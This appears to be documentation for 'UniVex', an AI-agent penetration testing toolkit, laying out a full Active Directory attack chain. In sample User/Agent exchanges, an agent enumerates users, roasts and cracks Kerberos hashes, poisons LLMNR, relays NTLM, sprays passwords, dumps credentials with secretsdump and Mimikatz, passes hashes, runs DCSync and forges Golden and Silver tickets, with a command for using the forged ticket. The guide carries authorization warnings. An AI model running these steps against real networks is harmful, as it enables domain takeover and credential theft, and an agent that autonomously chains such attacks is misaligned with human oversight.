# UniVex — Active Directory Attack Guide

> **v3.0.0** — BloodHound integration, comprehensive AD attack methodology, and credential attack suite.

---

## Overview

UniVex v3.0 provides a complete Active Directory penetration testing toolkit, from initial network enumeration through domain compromise. The toolkit integrates **BloodHound attack path visualization** with a full credential attack suite including Responder, ntlmrelayx, Mimikatz, DCSync, and Kerberos ticket attacks.

This guide covers the complete AD attack kill chain as used in professional penetration tests and red team operations.

---

## AD Attack Kill Chain

```
Phase 1: Network Discovery & AD Enumeration
    Network scan → SMB/LDAP host discovery → Null session enum
                          │
                          ▼
Phase 2: Initial Credential Access
    Kerbrute username enum → AS-REP Roasting → Kerberoasting
    Responder LLMNR/NBT-NS → Password spraying → Phishing
                          │
                          ▼
Phase 3: BloodHound Collection & Analysis
    SharpHound collection → JSON ingestion → Attack path queries
    Identify: shortest path to DA, DCSync accounts, AdminTo chains
                          │
                          ▼
Phase 4: Lateral Movement
    Pass-the-Hash → Pass-the-Ticket → Remote code execution
    CrackMapExec spray → secretsdump → Hash cracking
                          │
                          ▼
Phase 5: Privilege Escalation
    BloodHound attack path execution → GPO abuse → ACL exploitation
    Delegation abuse → Constrained/unconstrained delegation
                          │
                          ▼
Phase 6: Domain Compromise
    DCSync → NTDS dump → Golden Ticket → Persistent access
```

---

## Phase 1: Network Discovery & AD Enumeration

### Network Scanning

```
User: Scan the 10.10.10.0/24 network for Windows hosts

Agent: [PortScanTool]: Running nmap -sV -p 88,135,139,389,445,464,636,3268,3389 10.10.10.0/24
       Found:
       - 10.10.10.100 DC01.CORP.LOCAL (Windows Server 2019) — AD DS, DNS, LDAP, Kerberos
       - 10.10.10.101 WEB01.CORP.LOCAL (Windows Server 2016) — IIS, RDP
       - 10.10.10.102 DEV01.CORP.LOCAL (Windows 10) — RDP, SMB
```

### SMB/LDAP Enumeration

```python
# Via AI agent:
"Enumerate SMB shares and users on DC01.CORP.LOCAL"
"Run LDAP anonymous bind against 10.10.10.100"
"Enumerate all users and groups from LDAP"
```

**Enum4Linux:**
```
User: Run enum4linux against 10.10.10.100

Agent: [Enum4LinuxTool]: Enumerating DC01.CORP.LOCAL...
       Domain: CORP.LOCAL
       Domain SID: S-1-5-21-...
       Users: john.smith, jane.doe, svc.backup, administrator, ...
       Groups: Domain Admins, Domain Users, IT-Admins, ...
       Shares: SYSVOL, NETLOGON, IPC$
```

---

## Phase 2: Initial Credential Access

### Username Enumeration (Kerbrute)

```
User: Enumerate valid AD usernames using the top-usernames.txt wordlist against CORP.LOCAL

Agent: [KerbrouteTool]: Running kerbrute userenum against 10.10.10.100...
       Valid users found:
       ✅ administrator@CORP.LOCAL
       ✅ john.smith@CORP.LOCAL
       ✅ svc.backup@CORP.LOCAL
       ❌ test@CORP.LOCAL (not found)
```

### AS-REP Roasting (No Pre-Auth Required)

```
User: Run AS-REP roasting against all discovered users

Agent: [ASREPRoastTool]: Checking for accounts with pre-auth disabled...
       Vulnerable: svc.backup@CORP.LOCAL (DO_NOT_REQUIRE_PREAUTH)
       
       AS-REP hash captured:
       $krb5asrep$23$svc.backup@CORP.LOCAL:ABC123DEF...
       
       [HashCrackTool]: Cracking with rockyou.txt...
       Cracked: svc.backup → Password123!
```

### Kerberoasting (Service Account Hashes)

```
User: Run Kerberoasting to extract service account hashes

Agent: [KerberoastTool]: Finding SPNs with credentials john.smith:Password1...
       Kerberoastable accounts:
       - MSSQLSvc/sqlserver.CORP.LOCAL:1433 → svc.mssql
       - HTTP/webserver.CORP.LOCAL → svc.iis
       
       Hashes captured and written to kerberoast-hashes.txt
       
       [HashCrackTool]: Cracking with rockyou.txt + rules...
       Cracked: svc.mssql → Summer2024!
```

### Responder — LLMNR/NBT-NS Poisoning

```
User: Start Responder to capture NTLM hashes on the 10.10.10.0/24 network

Agent: [ResponderTool]: Starting Responder on eth0...
       Listening for: LLMNR, NBT-NS, MDNS
       
       [+] Captured NTLMv2 hash for john.smith:
       john.smith::CORP:AABBCCa...
       
       [HashCrackTool]: Cracking NTLMv2 hash...
       Cracked: john.smith → Welcome1
```

> ⚠️ **Legal Warning**: Responder is a network-level attack. Only run this in environments where you have explicit written authorization. It will affect all hosts on the local network segment.

### NTLM Relay

```
User: Relay captured NTLM hashes to 10.10.10.101

Agent: [NTLMRelayTool]: Starting ntlmrelayx targeting 10.10.10.101 (SMB signing: disabled)...
       
       [+] Relaying NTLM authentication from john.smith
       [+] SMB connection to WEB01 established
       [+] Executing: whoami
       nt authority\system
       
       [+] Dumping SAM from WEB01...
       Administrator:500:aad3b...
       john.smith:1001:aad3b...
```

### Password Spraying

```
User: Spray the password Welcome1 against all discovered users (respect lockout policy)

Agent: [CrackMapExecTool]: Spraying Welcome1 against 47 users with 1 attempt per 30 minutes...
       [+] CORP.LOCAL\jane.doe:Welcome1 (Pwn3d!)
       [-] 46 accounts: bad password
```

---

## Phase 3: BloodHound Collection & Analysis

### Running SharpHound Collection

```
User: Collect BloodHound data from the CORP.LOCAL domain

Agent: [BloodHoundCollectTool]: Running SharpHound collection...
       Method: All (ACLs, ObjectProps, Sessions, Trusts, LocalAdmin)
       Domain: CORP.LOCAL
       DC: DC01.CORP.LOCAL
       
       Collection complete: 20231201_BloodHound_CORP.zip
       - Users: 247
       - Computers: 89
       - Groups: 143
       - GPOs: 34
       - OUs: 18
       
       [BloodHoundIngestTool]: Ingesting into Neo4j...
       ✅ Ingestion complete. 2,847 nodes, 15,932 relationships created.
```

### Attack Path Queries

BloodHound data is queried using 28 pre-built Cypher queries:

```
User: Find the shortest path from john.smith to Domain Admins

Agent: [AttackPathQueryTool]: Running "shortest_path_to_da"...
       
       Shortest path (3 hops):
       john.smith → [MemberOf] → IT-Helpdesk
                 → [AdminTo] → DEV01.CORP.LOCAL
                 → [HasSession] → jane.doe (Domain Admin)
       
       Attack plan:
       1. Compromise DEV01 via AdminTo (john.smith is local admin)
       2. Extract jane.doe's session token from memory (Mimikatz)
       3. Pass-the-hash/ticket as jane.doe to DC01
```

**Available BloodHound Queries:**

| Query | Description |
|-------|-------------|
| `shortest_path_to_da` | Shortest path from any owned user to Domain Admins |
| `find_da_sessions` | Find computers where Domain Admins have sessions |
| `find_dcync_rights` | Accounts with DCSync rights (GetChanges + GetChangesAll) |
| `find_admin_to_chains` | AdminTo relationships from owned accounts |
| `find_kerberoastable_das` | Domain Admins that are Kerberoastable |
| `find_asrep_roastable` | Accounts with pre-auth disabled |
| `find_unconstrained_delegation` | Computers with unconstrained delegation |
| `find_constrained_delegation` | Accounts with constrained delegation |
| `find_gpo_admin_paths` | GPO paths to administrative access |
| `find_acl_paths` | ACL-based attack paths (WriteDacl, GenericAll, etc.) |
| `find_computers_with_local_admin` | Computers where users have local admin |
| `find_domain_trusts` | Domain trust relationships |
| ... | 16 more queries |

```
User: Show me all computers where Domain Admins have active sessions

Agent: [AttackPathQueryTool]: Running "find_da_sessions"...
       
       Computers with DA sessions:
       - DEV01.CORP.LOCAL — Administrator (logged in 2 hours ago)
       - MGMT01.CORP.LOCAL — jane.doe (active session)
       
       Recommended: Compromise DEV01 and extract Administrator token.
```

---

## Phase 4: Credential Extraction & Lateral Movement

### SecretsDump (Remote)

```
User: Dump credentials from WEB01.CORP.LOCAL using john.smith's credentials

Agent: [SecretsDumpTool]: Running secretsdump against WEB01.CORP.LOCAL...
       Credentials:
       Administrator:500:aad3b435b51404eeaad3b435b51404ee:2B576ACBE6BCFDA7294D6BD18041B8FE:::
       john.smith:1001:aad3b435b51404eeaad3b435b51404ee:C46B9E3A5EE35EE7D84C0EB9AAB0E88E:::
       svc.backup:1002:aad3b435b51404eeaad3b435b51404ee:A5E95E1AD98C3F5D8B2EA789F77C0CDA:::
       
       LSA Secrets:
       _SC_BackupService: P@ssw0rd2024
       DPAPI_SYSTEM: 0x01000000...
```

### Mimikatz (Local Credential Extraction)

```
User: Run Mimikatz on DEV01 to extract credentials from memory

Agent: [MimikatzTool]: Executing logonpasswords on DEV01.CORP.LOCAL...
       
       Authentication Id : 0 ; 1234567 (00000000:0012d687)
       Session           : Interactive from 2
       User Name         : jane.doe
       Domain            : CORP
       NTLM              : D6B8B5E4E2C8B8B3A8E4C1D2B3E4C5D6
       SHA1              : ...
       
       Plaintext passwords:
       jane.doe:Summer2024!
```

### Pass-the-Hash

```
User: Pass-the-hash as Administrator to access DC01

Agent: [PassTheHashTool]: PtH with Administrator:2B576ACBE6BCFDA7294D6BD18041B8FE to DC01.CORP.LOCAL...
       [+] Authentication successful
       [+] RCE: whoami → CORP\administrator
```

---

## Phase 5 & 6: Domain Compromise

### DCSync Attack

```
User: Run DCSync to dump the krbtgt and Administrator hashes from the domain

Agent: [DCSyncTool]: Executing DCSync for CORP.LOCAL...
       (using jane.doe's credentials with DCSync rights)
       
       [*] Dumping domain hashes...
       Administrator:500:aad3b435b51404eeaad3b435b51404ee:2B576ACBE6BCFDA7294D6BD18041B8FE:::
       krbtgt:502:aad3b435b51404eeaad3b435b51404ee:D18B2C584E71C47E8A17B0D5C17C4C1A:::
       
       [+] DCSync complete. 247 hashes extracted.
```

### Golden Ticket Creation

```
User: Create a Golden Ticket for persistent domain access

Agent: [GoldenTicketTool]: Creating Golden Ticket for CORP.LOCAL...
       krbtgt hash: D18B2C584E71C47E8A17B0D5C17C4C1A
       Domain SID: S-1-5-21-1234567890-0987654321-1122334455
       
       [+] Golden Ticket created: golden_ticket.ccache
       [+] Ticket valid for 10 years (default kerberos max)
       
       Usage: export KRB5CCNAME=golden_ticket.ccache
              python3 psexec.py -k -no-pass CORP.LOCAL/administrator@DC01.CORP.LOCAL
```

### Silver Ticket (Service Impersonation)

```
User: Create a Silver Ticket for the CIFS service on FILE01

Agent: [SilverTicketTool]: Creating Silver Ticket...
       Service: CIFS/FILE01.CORP.LOCAL
       Service account NTLM: ABCDEF1234567890...
       
       [+] Silver Ticket created: silver_ticket.ccache
       [+] Access granted to CIFS/FILE01 without contacting DC
```

---

## AutoChain: Full AD Attack Pipeline

The `ad_full_chain` AutoChain template automates the entire kill chain:

```
User: Run the ad_full_chain template against 10.10.10.0/24

Agent: [AutoChain]: Starting ad_full_chain template...
       
       Step 1/12: Network scan ........................ ✅ Found 15 hosts
       Step 2/12: SMB/LDAP enumeration ............... ✅ Domain: CORP.LOCAL, 247 users
       Step 3/12: Username enumeration (Kerbrute) .... ✅ 89 valid users
       Step 4/12: AS-REP Roasting .................... ✅ 2 hashes captured
       Step 5/12: Kerberoasting ...................... ✅ 5 hashes captured
       Step 6/12: Hash cracking ...................... ✅ 4 cracked (rockyou.txt)
       Step 7/12: BloodHound collection .............. ✅ 2847 nodes ingested
       Step 8/12: Attack path analysis ............... ✅ Shortest path: 3 hops to DA
       Step 9/12: Lateral movement to DEV01 .......... ✅ Shell obtained
       Step 10/12: SecretsDump ....................... ✅ 23 hashes extracted
       Step 11/12: DCSync attack ..................... ✅ krbtgt hash obtained
       Step 12/12: Report generation ................. ✅ AD_Attack_Report.pdf generated
       
       🎯 Domain compromise achieved in 47 minutes.
```

---

## Environment Configuration

```bash
# .env settings for AD attack tools
BLOODHOUND_URI=bolt://neo4j:7687
BLOODHOUND_USER=neo4j
BLOODHOUND_PASSWORD=change_this_secure_password
BLOODHOUND_DEFAULT_DOMAIN=CORP.LOCAL
BLOODHOUND_INGEST_PATH=/data/bloodhound

RESPONDER_INTERFACE=eth0
NTLM_RELAY_REQUIRE_APPROVAL=true

DESER_SERVER_HOST=kali-tools
DESER_SERVER_PORT=8012
```

---

## Legal and Ethical Considerations

> ⚠️ **IMPORTANT**: These tools perform destructive and highly intrusive operations.

- Always obtain **explicit written authorization** before running these tools
- Responder/ntlmrelayx affect **all hosts on the network segment** — use only in isolated test environments or with full network scope authorization
- DCSync and Golden Ticket attacks directly manipulate domain-level secrets — these require explicit scope coverage
- Golden Tickets remain valid for the krbtgt password reset interval (typically 2 rotations = ~60 days) — ensure proper cleanup in engagements

---

## See Also

- [API Reference](API_REFERENCE.md) — BloodHound API endpoints
- [Pivoting Guide](PIVOTING_GUIDE.md) — Access internal AD environments
- [Architecture](ARCHITECTURE.md) — BloodHound Neo4j integration design
